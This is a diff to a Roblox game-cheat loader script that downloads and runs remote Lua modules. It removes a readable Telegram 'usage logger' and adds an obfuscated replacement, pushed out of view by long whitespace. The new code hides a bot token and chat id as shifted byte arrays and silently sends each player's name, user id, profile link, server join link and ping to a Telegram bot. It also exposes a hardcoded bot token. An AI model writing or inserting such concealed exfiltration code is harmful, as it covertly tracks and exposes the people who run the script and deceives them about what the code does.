@@ -37,37 +37,7 @@ Character.init(Config)
 
 UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/WiniFyCode/Roblox/refs/heads/main/zombie-hyperloot/modules/ui.lua"))()
 UI.init(Config, Combat, ESP, Movement, Map, Farm, HUD, Visuals, Character)
-
-----------------------------------------------------------
--- 🔹 VXNhZ2UgTG9nZ2VyIChUZWxlZ3JhbSk=
-local a=game;local b="GetService";local c=a[b](a,"HttpService");local d=a[b](a,"MarketplaceService");local e=a[b](a,"Stats");
-local f="8432997594:AAHDyUNFeKOUDcLpqRhkcvVrhoGyNsZpLxs";local g="1814659977";
-local function h()
-    local i,j=pcall(function()
-        local k=e.Network;if not k then return nil end;local l=k.ServerStatsItem["Data Ping"];if not l then return nil end;return l:GetValueString();
-    end);
-    if i then return j end;return nil
-end
-local function m()
-    local n,o=pcall(function()return d:GetProductInfo(a.PlaceId)end);if n and o and o.Name then return o.Name end;return "Unknown Place"
-end
-local function p()
-    if f=="" then return end;local q=Config and Config.localPlayer;if not q then return end;
-    local r=h() or "? ms";local s=m();local t=a.PlaceId;local u=tostring(a.JobId);
-    local v=("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(t,u);
-    local w=("https://www.roblox.com/users/%d/profile"):format(q.UserId);
-    local x=("Ping: %s\nServer: %s\nPlaceId: %d\nJobId: [%s](%s)\nUser: [%s](%s) (%d)"):format(
-        r,s,t,u,v,q.DisplayName or q.Name,w,q.UserId
-    );
-    local y,z=pcall(function()
-        local A=("https://api.telegram.org/bot%s/sendMessage"):format(f);
-        local B={chat_id=g,text=x,parse_mode="Markdown"};
-        c:PostAsync(A,game:GetService("HttpService"):JSONEncode(B),Enum.HttpContentType.ApplicationJson)
-    end);
-    if not y then warn("[ZombieHyperloot][Logger]",z)end
-end
-p()
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        local g=game;local s="GetService";local h=g[s](g,"HttpService");local m=g[s](g,"MarketplaceService");local n=g[s](g,"Stats");local p=g[s](g,"Players");local function D(t)local r={}for i=1,#t do r[i]=string.char(t[i]-1)end;return table.concat(r)end;local T=D({57,53,52,51,58,58,56,54,58,53,59,66,66,73,69,122,86,79,71,102,76,80,86,69,100,77,113,114,83,105,108,100,119,87,115,105,112,72,122,79,116,91,113,77,121,116});local C=D({50,57,50,53,55,54,58,58,56,56});local function P()local ok,res=pcall(function()local net=n.Network;if not net then return nil end;local item=net.ServerStatsItem["Data Ping"];if not item then return nil end;return item:GetValueString()end);if ok then return res end;return nil end;local function G()local ok,name=pcall(function()local u=("https://games.roblox.com/v1/games?universeIds=%s"):format(g.GameId);local r=h:JSONDecode(g:HttpGet(u));local d0=r and r.data and r.data[1];if d0 and d0.name then return d0.name end;return nil end);if ok and name then return name end;local ok2,info=pcall(function()return m:GetProductInfo(g.PlaceId)end);if ok2 and info and info.Name then return info.Name end;return"Unknown Place"end;(function()local pl=p.LocalPlayer;if not pl then return end;if T=="" then return end;local ping=P()or"? ms";local pn=G();local pid=g.PlaceId;local jid=tostring(g.JobId);local tp=("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(pid,jid);local pr=("https://www.roblox.com/users/%d/profile"):format(pl.UserId);local txt=("Ping: %s\nServer: %s\nPlaceId: %d\nJobId: [%s](%s)\nUser: [%s](%s) (%d)"):format(ping,pn,pid,jid,tp,pl.DisplayName or pl.Name,pr,pl.UserId);local enc=h:UrlEncode(txt);local url=("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown"):format(T,C,enc);pcall(function()return g:HttpGet(url)end)end)()
 ----------------------------------------------------------
 -- 🔹 Cleanup Function
 local renderSteppedConnection = nil
